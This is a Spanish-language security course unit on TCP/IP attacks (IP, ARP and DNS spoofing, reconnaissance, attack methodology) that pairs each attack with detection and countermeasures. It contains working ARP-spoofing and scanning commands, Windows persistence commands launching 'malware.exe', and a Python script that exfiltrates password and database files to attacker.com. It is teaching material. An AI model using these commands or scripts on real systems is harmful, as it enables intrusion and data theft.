# Tema 5: Ataques TCP/IP

## Índice de Contenidos
1. [Tipos de Ataques contra Redes TCP/IP](#tipos-de-ataques-contra-redes-tcpip)
2. [IP Spoofing](#ip-spoofing)
3. [ARP Spoofing](#arp-spoofing)
4. [DNS Spoofing y Cache Poisoning](#dns-spoofing-y-cache-poisoning)
5. [Actividades Previas a un Ataque](#actividades-previas-a-un-ataque)
6. [Herramientas de Reconocimiento](#herramientas-de-reconocimiento)
7. [Metodología de Ataque](#metodología-de-ataque)

---

## Tipos de Ataques contra Redes TCP/IP

### Clasificación General de Ataques
```
Ataques TCP/IP por Objetivo:
├── Confidencialidad
│   ├── Packet sniffing
│   ├── Man-in-the-middle
│   ├── Session hijacking
│   └── Traffic analysis
├── Integridad
│   ├── Data modification
│   ├── Message insertion
│   ├── Replay attacks
│   └── Protocol manipulation
├── Disponibilidad
│   ├── DoS/DDoS attacks
│   ├── Resource exhaustion
│   ├── Bandwidth consumption
│   └── Service disruption
└── Autenticación
    ├── Identity spoofing
    ├── Credential theft
    ├── Authentication bypass
    └── Privilege escalation
```

### Ataques de Falsificación (Spoofing)

#### Spoofing de Direcciones IP
**Mecanismos de IP Spoofing:**
- Modificación del campo Source IP
- Evasión de filtros basados en IP
- Ocultación de la identidad real del atacante
- Facilitación de otros tipos de ataques

#### Spoofing de Protocolos
**TCP Spoofing:**
- Predicción de números de secuencia
- Inyección de paquetes falsificados
- Terminación prematura de conexiones
- Secuestro de sesiones establecidas

**UDP Spoofing:**
- Más fácil que TCP (no hay secuencias)
- Amplification attacks
- Reflection attacks
- DNS cache poisoning

### Ataques Man-in-the-Middle

#### Técnicas MITM
```
Man-in-the-Middle Attack Flow:
Cliente ←→ Atacante ←→ Servidor
   │        (MITM)        │
   │                      │
   ├─ Request ──────────→ │ (intercepted)
   │                      │
   │ ←──── Response ──────┤ (modified)
   │                      │
```

**Métodos de Implementación:**
- ARP spoofing en LANs
- DNS spoofing/pharming
- BGP hijacking (ASN level)
- SSL/TLS certificate attacks
- WiFi evil twin attacks

### Session Hijacking

#### TCP Session Hijacking Process
```
Session Hijacking Steps:
1. Monitor target connection
2. Predict sequence numbers
3. Desynchronize legitimate client
4. Inject malicious packets
5. Maintain session control

Sequence Number Prediction:
├── Initial sequence sampling
├── Pattern analysis
├── Timing correlation
├── Statistical prediction
└── Injection timing
```

**Contramedidas:**
- Random sequence number generation
- Session tokens/cookies
- Mutual authentication
- Encrypted connections (TLS)
- Network segmentation

---

## IP Spoofing

### Fundamentos del IP Spoofing

#### Facilidad de Implementación
**Por qué es Posible:**
- IP header no tiene verificación de autenticidad
- Routers confían en source IP field
- No hay validación end-to-end en IP básico
- Filtrado inconsistente en Internet

#### Tipos de IP Spoofing
```
Clasificación de IP Spoofing:
├── Blind Spoofing
│   ├── Atacante no ve respuestas
│   ├── Requiere predicción avanzada
│   ├── Útil para DoS attacks
│   └── Difícil para session hijacking
├── Non-blind Spoofing
│   ├── Atacante puede ver tráfico
│   ├── Mismo segmento de red
│   ├── Más fácil de ejecutar
│   └── Mayor control sobre ataque
└── Reflection Spoofing
    ├── Usa terceros como reflectores
    ├── Amplifica el ataque
    ├── Oculta origen real
    └── Usado en DDoS attacks
```

### Técnicas de IP Spoofing

#### Raw Socket Programming
**Creación de Paquetes Falsificados:**
```c
// Ejemplo conceptual en C
struct iphdr {
    unsigned int version:4;
    unsigned int ihl:4;
    unsigned int tos:8;
    unsigned int tot_len:16;
    unsigned int id:16;
    unsigned int frag_off:16;
    unsigned int ttl:8;
    unsigned int protocol:8;
    unsigned int check:16;
    unsigned int saddr:32;    // Source IP (spoofed)
    unsigned int daddr:32;    // Destination IP
};
```

#### Herramientas para IP Spoofing
**Herramientas Comunes:**
- **Hping3**: Packet crafting y testing
- **Scapy**: Python library para packet manipulation
- **Netwox**: Suite de herramientas de red
- **Sendip**: Command-line packet generator
- **Ostinato**: GUI packet generator

### Detección de IP Spoofing

#### Técnicas de Detección
```
Métodos de Detección:
├── TTL Analysis
│   ├── Comparar TTL esperado vs recibido
│   ├── Mapear rutas de red conocidas
│   └── Identificar inconsistencias
├── Timing Analysis
│   ├── Round-trip time patterns
│   ├── Jitter measurement
│   └── Delay correlation
├── Path Analysis
│   ├── Traceroute verification
│   ├── Router path validation
│   └── BGP route consistency
└── Statistical Analysis
    ├── Traffic pattern analysis
    ├── Volume anomalies
    └── Source distribution analysis
```

### Contramedidas contra IP Spoofing

#### Filtrado de Red
**Ingress Filtering (RFC 2827):**
- Validar que source IP pertenece a la red local
- Bloquear paquetes con source IP externo
- Implementar en edge routers
- Reducir ataques desde esa red

**Egress Filtering:**
- Validar source IP saliente
- Prevenir que red local sea origen de spoofing
- Bloquear private IPs dirigidos a Internet
- Implementar políticas de routing consistentes

#### Network Design
```
Arquitectura Anti-Spoofing:
Internet
   │
   ▼
Firewall/Router (Ingress filtering)
   │
   ├─ DMZ (Servers públicos)
   │   └─ Anti-spoofing rules
   │
   └─ LAN (Red interna)
       └─ Egress filtering
```

---

## ARP Spoofing

### Address Resolution Protocol (ARP)

#### Funcionamiento Normal de ARP
```
ARP Process:
Host A (192.168.1.10) quiere comunicarse con Host B (192.168.1.20)

1. ARP Request (Broadcast):
   Who has 192.168.1.20? Tell 192.168.1.10
   
2. ARP Reply (Unicast):
   192.168.1.20 is at AA:BB:CC:DD:EE:FF
   
3. ARP Table Update:
   Host A actualiza tabla: 192.168.1.20 → AA:BB:CC:DD:EE:FF
```

#### Vulnerabilidades de ARP
**Problemas de Diseño:**
- No hay autenticación en ARP replies
- Acepta respuestas no solicitadas (gratuitous ARP)
- Cache overwrite sin validación
- Confianza en último ARP reply recibido

### Ataques ARP Spoofing

#### ARP Cache Poisoning
```
ARP Spoofing Attack:
Víctima (192.168.1.10) ←→ Gateway (192.168.1.1)
                 ↑              ↑
                 │              │
              Fake ARP       Fake ARP
                 │              │
                 ▼              ▼
         Atacante (192.168.1.100)

Atacante envía:
├── A Víctima: "192.168.1.1 is at [MAC-Atacante]"
└── A Gateway: "192.168.1.10 is at [MAC-Atacante]"
```

#### Técnicas Avanzadas
**Selective ARP Poisoning:**
- Envenenamiento de entradas específicas
- Ataques dirigidos a hosts particulares
- Minimizar detección por herramientas
- Maximizar stealth del ataque

**Mass ARP Poisoning:**
- Envenenamiento de toda la subred
- Ataque a múltiples víctimas simultáneamente
- Mayor impacto pero más detectable
- Útil para network reconnaissance

### Herramientas de ARP Spoofing

#### Herramientas Populares
**Ettercap:**
```bash
# ARP poisoning básico
ettercap -T -M arp:remote /192.168.1.10// /192.168.1.1//

# Con DNS spoofing combinado
ettercap -T -M arp:remote -P dns_spoof /192.168.1.10// /192.168.1.1//
```

**Bettercap:**
```bash
# Network discovery
net.probe on

# ARP spoofing
set arp.spoof.targets 192.168.1.10
arp.spoof on

# HTTP proxy
http.proxy on
```

**Arpspoof (dsniff suite):**
```bash
# Bidirectional ARP spoofing
arpspoof -i eth0 -t 192.168.1.10 192.168.1.1
arpspoof -i eth0 -t 192.168.1.1 192.168.1.10
```

### Detección de ARP Spoofing

#### Métodos de Detección
```
ARP Spoofing Detection:
├── Static ARP Tables
│   ├── Configuración manual de MAC addresses
│   ├── Prevención completa de ARP poisoning
│   └── Difícil de mantener en redes grandes
├── ARP Monitoring Tools
│   ├── arpwatch (Linux/Unix)
│   ├── XArp (Windows)
│   ├── ARP Guard (commercial)
│   └── Custom scripts
├── Network-based Detection
│   ├── Multiple MAC addresses para single IP
│   ├── Gratuitous ARP monitoring
│   ├── ARP reply frequency analysis
│   └── MAC address vendor validation
└── Host-based Detection
    ├── ARP table monitoring
    ├── Network connectivity verification
    ├── Latency anomaly detection
    └── Certificate validation failures
```

#### Configuración de Monitoreo
**Arpwatch Configuration:**
```bash
# /etc/arpwatch.conf
eth0 -f /var/lib/arpwatch/arp.dat -s root

# Monitoring script
#!/bin/bash
arpwatch -i eth0 -f /var/log/arp.log -n 192.168.1.0/24
```

### Contramedidas ARP

#### Configuraciones de Switch
**Port Security:**
```
Switch(config)# interface fastethernet 0/1
Switch(config-if)# switchport mode access
Switch(config-if)# switchport port-security
Switch(config-if)# switchport port-security maximum 1
Switch(config-if)# switchport port-security violation shutdown
Switch(config-if)# switchport port-security mac-address sticky
```

**Dynamic ARP Inspection (DAI):**
```
Switch(config)# ip arp inspection vlan 10
Switch(config)# interface fastethernet 0/1
Switch(config-if)# ip arp inspection trust
```

#### Segmentación de Red
```
Network Segmentation Strategy:
├── VLAN Segregation
│   ├── Separate VLANs por función
│   ├── Inter-VLAN routing controlado
│   └── Reduced broadcast domains
├── Network Access Control (NAC)
│   ├── 802.1X authentication
│   ├── MAC address validation
│   └── Device compliance checking
└── Micro-segmentation
    ├── Host-based firewalls
    ├── Zero-trust networking
    └── Application-level controls
```

---

## DNS Spoofing y Cache Poisoning

### Domain Name System (DNS)

#### Funcionamiento Normal de DNS
```
DNS Resolution Process:
1. Client query: www.example.com
2. Local DNS cache check
3. If not cached, query DNS server
4. DNS server responds with IP address
5. Client connects to resolved IP

DNS Hierarchy:
Root Servers (.)
     │
Top-Level Domain (.com)
     │
Authoritative Server (example.com)
     │
Resource Records (www.example.com → IP)
```

#### Vulnerabilidades DNS
**Problemas de Diseño Original:**
- No autenticación en DNS responses
- UDP protocol (connectionless, spoofable)
- Predictable transaction IDs
- Cache poisoning vulnerabilities
- Lack of encryption

### DNS Cache Poisoning

#### Kaminsky Attack (2008)
```
Cache Poisoning Process:
1. Atacante hace query para subdominio random
   (xyz123.target.com)
2. Mientras servidor busca respuesta autorizada
3. Atacante inunda con responses falsificadas
4. Si acierta Transaction ID, envenena cache
5. Autoritative server response ignored

Elementos a Predecir:
├── Transaction ID (16 bits) - vulnerable
├── Source Port (si no randomized)
├── Timing del query/response
└── DNS server behavior patterns
```

#### DNS Cache Poisoning Moderno
**Contramedidas Implementadas:**
- Source port randomization
- Transaction ID randomization
- Query name case randomization (0x20)
- DNSSEC validation
- DNS over HTTPS (DoH)
- DNS over TLS (DoT)

### Técnicas de DNS Spoofing

#### Local DNS Spoofing
**Hosts File Modification:**
```
# /etc/hosts (Linux/macOS)
# C:\Windows\System32\drivers\etc\hosts (Windows)
192.168.1.100    www.bank.com
192.168.1.100    mail.company.com
192.168.1.100    update.antivirus.com
```

**Local DNS Server Configuration:**
```
# dnsmasq configuration
address=/bank.com/192.168.1.100
address=/mail.company.com/192.168.1.100
```

#### Network-level DNS Spoofing
**Router/Gateway Modification:**
- Modification de DNS settings
- Custom DNS server setup
- Transparent DNS proxying
- DNS redirection rules

### DNSSEC (DNS Security Extensions)

#### Funcionamiento de DNSSEC
```
DNSSEC Validation Chain:
Root Zone (signed)
    │
    ▼ (DS record)
TLD Zone (.com, signed)
    │
    ▼ (DS record)  
Domain Zone (example.com, signed)
    │
    ▼ (RRSIG)
Resource Records (www.example.com A 192.0.2.1)

Record Types:
├── RRSIG (Resource Record Signature)
├── DNSKEY (DNS Public Key)
├── DS (Delegation Signer)
├── NSEC/NSEC3 (Next Secure)
└── CDS/CDNSKEY (Child DS)
```

#### Implementación DNSSEC
**Configuración BIND9:**
```bash
# Generar claves
dnssec-keygen -a RSASHA256 -b 2048 -n ZONE example.com
dnssec-keygen -a RSASHA256 -b 1024 -n ZONE -f KSK example.com

# Firmar zona
dnssec-signzone -o example.com -k Kexample.com.+008+12345.key \
  example.com.zone Kexample.com.+008+54321.key
```

### Detección de DNS Spoofing

#### Monitoreo y Detección
```
DNS Spoofing Detection Methods:
├── DNS Response Analysis
│   ├── Multiple A records para mismo dominio
│   ├── TTL inconsistencies
│   ├── Response time analysis
│   └── Geographic IP validation
├── Network Traffic Analysis
│   ├── Unusual DNS query patterns
│   ├── High volume of NXDOMAIN responses
│   ├── DNS tunneling detection
│   └── Suspicious DNS servers
├── DNSSEC Validation
│   ├── Signature verification failures
│   ├── Chain of trust breaks
│   ├── DNSSEC-enabled resolvers
│   └── Validation logging
└── Behavioral Analysis
    ├── User access pattern changes
    ├── SSL certificate warnings
    ├── Application connectivity issues
    └── Performance anomalies
```

#### Herramientas de Monitoreo DNS
**Open Source Tools:**
- **dig**: DNS lookup utility con DNSSEC support
- **nslookup**: Basic DNS resolution testing
- **host**: Simple DNS lookup tool
- **drill**: DNSSEC-aware DNS lookup
- **Unbound**: Validating DNS resolver

---

## Actividades Previas a un Ataque

### Metodología de Reconocimiento

#### Fases de Reconnaissance
```
Information Gathering Process:
├── Passive Reconnaissance
│   ├── No direct contact con target
│   ├── Publicly available information
│   ├── Low risk of detection
│   └── Foundation para active reconnaissance
└── Active Reconnaissance
    ├── Direct interaction con target
    ├── Network scanning y probing
    ├── Higher risk of detection
    └── Detailed technical information
```

### Footprinting y OSINT

#### Fuentes de Información Pública
**Domain Information:**
```bash
# Whois lookup
whois example.com

# DNS enumeration
dig example.com ANY
dig @8.8.8.8 example.com MX
nslookup -type=NS example.com

# Subdomain enumeration
dnsrecon -d example.com
sublist3r -d example.com
amass enum -d example.com
```

**Social Media Intelligence (SOCMINT):**
- LinkedIn employee enumeration
- Facebook company pages
- Twitter corporate accounts
- GitHub organization repositories
- Stack Overflow employee profiles

**Search Engine Intelligence:**
```
Google Dorking Examples:
├── site:example.com filetype:pdf
├── site:example.com inurl:admin
├── site:example.com "confidential"
├── intitle:"index of" site:example.com
└── "example.com" filetype:xls OR filetype:doc

Shodan Searches:
├── org:"Company Name"
├── hostname:"example.com"
├── port:22,80,443 org:"Company"
└── product:"Apache" org:"Company"
```

#### Technical Footprinting
**Network Range Discovery:**
- ASN (Autonomous System Number) lookup
- BGP route analysis  
- CIDR block identification
- IP geolocation mapping

### Network Scanning

#### Host Discovery
```bash
# Nmap host discovery
nmap -sn 192.168.1.0/24          # Ping sweep
nmap -sn -PS22,80,443 192.168.1.0/24  # SYN ping
nmap -sn -PU53 192.168.1.0/24     # UDP ping

# Advanced host discovery
nmap -sn -PE -PP -PM 192.168.1.0/24  # ICMP types
masscan -p80,8000-8100 192.168.1.0/24 --rate=10000
```

#### Port Scanning Techniques
```
Port Scanning Methods:
├── TCP Connect Scan (-sT)
│   ├── Complete 3-way handshake
│   ├── Reliable pero detectable
│   └── No requiere privilegios root
├── SYN Scan (-sS) "Stealth scan"
│   ├── Half-open connections
│   ├── Faster y less detectable
│   └── Requiere privilegios root
├── UDP Scan (-sU)
│   ├── Slower than TCP scanning
│   ├── Stateless protocol challenges
│   └── Important para service discovery
├── FIN Scan (-sF)
│   ├── Evasion de simple firewalls
│   ├── Unexpected FIN packets
│   └── OS fingerprinting capabilities
└── Idle Scan (-sI)
    ├── Uses zombie host
    ├── Ultimate stealth technique
    └── Complex pero untraceable
```

### Service Enumeration

#### Banner Grabbing
```bash
# Telnet banner grabbing
telnet target.com 80
GET / HTTP/1.1
Host: target.com

# Netcat banner grabbing
nc -nv target.com 22
nc -nv target.com 25

# Nmap service detection
nmap -sV target.com
nmap -sC target.com  # Default scripts
```

#### Specific Service Enumeration
**HTTP/HTTPS Services:**
```bash
# Web server enumeration
nikto -h http://target.com
dirb http://target.com
gobuster dir -u http://target.com -w wordlist.txt

# SSL/TLS information
sslscan target.com:443
sslyze target.com:443
testssl.sh target.com
```

**SMB/NetBIOS Services:**
```bash
# SMB enumeration
enum4linux target.com
smbclient -L //target.com
nbtscan 192.168.1.0/24

# Null session enumeration
rpcclient -U "" target.com
smbclient //target.com/IPC$ -U ""
```

**SNMP Services:**
```bash
# SNMP enumeration
snmpwalk -c public -v1 target.com
onesixtyone -c community.txt target.com
snmp-check target.com
```

---

## Herramientas de Reconocimiento

### Suite Nmap

#### Nmap Advanced Usage
```bash
# Comprehensive scan
nmap -A -T4 target.com

# Script engine usage
nmap --script vuln target.com
nmap --script discovery target.com
nmap --script "not intrusive" target.com

# Custom timing y evasion
nmap -T0 target.com              # Paranoid timing
nmap -f target.com               # Fragment packets
nmap -D decoy1,decoy2 target.com # Decoy scan
nmap --source-port 53 target.com # Source port manipulation
```

#### Nmap Scripting Engine (NSE)
```lua
-- Example NSE script structure
description = [[
Detects if target is vulnerable to specific attack
]]

author = "Security Researcher"
license = "Same as Nmap"
categories = {"discovery", "safe"}

portrule = shortport.http
action = function(host, port)
  -- Script logic here
  return result
end
```

### Automated Reconnaissance Tools

#### Recon-ng Framework
```bash
# Recon-ng usage
recon-ng
marketplace install all
workspaces create target_company

# Domain reconnaissance
modules load recon/domains-hosts/hackertarget
options set SOURCE example.com
run

# Contact enumeration  
modules load recon/domains-contacts/whois_pocs
options set SOURCE example.com
run
```

#### TheHarvester
```bash
# Email harvesting
theHarvester -d example.com -b google -l 500
theHarvester -d example.com -b linkedin -l 200
theHarvester -d example.com -b all
```

### Vulnerability Assessment

#### Vulnerability Scanners
**OpenVAS:**
```bash
# OpenVAS setup y scanning
openvas-setup
openvas-start
openvas-adduser

# Web interface: https://localhost:9392
```

**Nessus:**
- Commercial vulnerability scanner
- Comprehensive vulnerability database
- Compliance checking capabilities
- Advanced reporting features

#### Custom Vulnerability Scripts
```python
#!/usr/bin/env python3
# Custom vulnerability checker
import requests
import sys

def check_vulnerability(target_url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (compatible; SecurityScanner/1.0)'
    }
    
    # Test for specific vulnerability
    test_payload = "' OR '1'='1"
    response = requests.get(f"{target_url}?id={test_payload}", 
                          headers=headers)
    
    if "mysql_error" in response.text.lower():
        return True
    return False

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 vuln_checker.py <URL>")
        sys.exit(1)
    
    target = sys.argv[1]
    if check_vulnerability(target):
        print(f"[+] Vulnerability found in {target}")
    else:
        print(f"[-] No vulnerability detected in {target}")
```

---

## Metodología de Ataque

### Cyber Kill Chain

#### Lockheed Martin Cyber Kill Chain
```
Cyber Kill Chain Phases:
├── 1. Reconnaissance
│   ├── Passive information gathering
│   ├── Active network scanning
│   └── Vulnerability identification
├── 2. Weaponization
│   ├── Malware creation/customization
│   ├── Exploit development
│   └── Delivery mechanism preparation
├── 3. Delivery
│   ├── Email attachments
│   ├── Malicious websites
│   └── USB/physical media
├── 4. Exploitation
│   ├── Vulnerability exploitation
│   ├── Code execution
│   └── Initial system compromise
├── 5. Installation
│   ├── Malware installation
│   ├── Backdoor creation
│   └── Persistence establishment
├── 6. Command & Control (C2)
│   ├── Communication channel setup
│   ├── Remote access establishment
│   └── Data exfiltration preparation
└── 7. Actions on Objectives
    ├── Data theft/exfiltration
    ├── System destruction
    └── Mission completion
```

### MITRE ATT&CK Framework

#### Tácticas y Técnicas
```
MITRE ATT&CK Tactics:
├── Initial Access
│   ├── T1566 Phishing
│   ├── T1190 Exploit Public-Facing Application
│   └── T1078 Valid Accounts
├── Execution
│   ├── T1059 Command and Scripting Interpreter
│   ├── T1106 Native API
│   └── T1204 User Execution
├── Persistence
│   ├── T1053 Scheduled Task/Job
│   ├── T1547 Boot or Logon Autostart Execution
│   └── T1543 Create or Modify System Process
├── Privilege Escalation
│   ├── T1068 Exploitation for Privilege Escalation
│   ├── T1134 Access Token Manipulation
│   └── T1055 Process Injection
└── [... más tácticas]
```

### Planificación del Ataque

#### Threat Modeling
```
Threat Model Components:
├── Assets
│   ├── Data assets (databases, files)
│   ├── System assets (servers, workstations)
│   └── Process assets (business processes)
├── Threats
│   ├── Threat actors (internal, external)
│   ├── Threat capabilities
│   └── Threat motivations
├── Vulnerabilities
│   ├── Technical vulnerabilities
│   ├── Process vulnerabilities
│   └── Human vulnerabilities
└── Controls
    ├── Preventive controls
    ├── Detective controls
    └── Corrective controls
```

#### Attack Vector Selection
**Factores de Selección:**
- Target accessibility
- Vulnerability severity
- Exploit reliability
- Detection probability
- Impact potential
- Resource requirements

### Post-Exploitation Activities

#### Persistence Mechanisms
```bash
# Windows persistence examples
# Registry autorun
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" 
    /v "SecurityUpdate" /t REG_SZ /d "C:\malware.exe"

# Scheduled task
schtasks /create /sc onlogon /tn "SecurityUpdate" 
    /tr "C:\malware.exe"

# Service creation
sc create "SecurityService" binpath= "C:\malware.exe"
sc config "SecurityService" start= auto
```

#### Lateral Movement
**Techniques:**
- Pass-the-Hash attacks
- Golden/Silver Ticket attacks  
- RDP/SSH credential reuse
- SMB relay attacks
- WMI/PowerShell remoting

#### Data Exfiltration
```python
# Example exfiltration script
import requests
import base64
import os

def exfiltrate_file(filepath, server_url):
    with open(filepath, 'rb') as f:
        file_data = base64.b64encode(f.read()).decode()
    
    payload = {
        'filename': os.path.basename(filepath),
        'data': file_data
    }
    
    requests.post(server_url, json=payload)

# Usage
sensitive_files = [
    "C:\\Users\\admin\\Documents\\passwords.txt",
    "C:\\database\\backup.sql"
]

for file in sensitive_files:
    if os.path.exists(file):
        exfiltrate_file(file, "http://attacker.com/upload")
```

### Defense Evasion

#### Anti-Forensics Techniques
- Log deletion/modification
- Timestamp manipulation
- File wiping/shredding
- Memory dumps clearing
- Network artifact cleanup

#### Steganography
```python
# Simple LSB steganography example
from PIL import Image

def hide_message(image_path, message, output_path):
    img = Image.open(image_path)
    binary_message = ''.join(format(ord(char), '08b') for char in message)
    binary_message += '1111111111111110'  # Delimiter
    
    pixels = list(img.getdata())
    new_pixels = []
    
    for i, pixel in enumerate(pixels):
        if i < len(binary_message):
            # Modify LSB of red channel
            r, g, b = pixel
            r = (r & 0xFE) | int(binary_message[i])
            new_pixels.append((r, g, b))
        else:
            new_pixels.append(pixel)
    
    new_img = Image.new(img.mode, img.size)
    new_img.putdata(new_pixels)
    new_img.save(output_path)
```

## Objetivos de Aprendizaje
- [ ] Identificar diferentes tipos de ataques TCP/IP
- [ ] Comprender las técnicas de spoofing
- [ ] Realizar reconocimiento ético de redes
- [ ] Implementar contramedidas efectivas
- [ ] Analizar la metodología de un atacante

## Recursos Adicionales
- Herramientas de penetration testing
- Laboratorios virtuales para práctica
- Documentación técnica de protocolos

## Actividades
- Laboratorio de spoofing ético
- Escaneo de vulnerabilidades
- Análisis forense de ataques
- Implementación de contramedidas
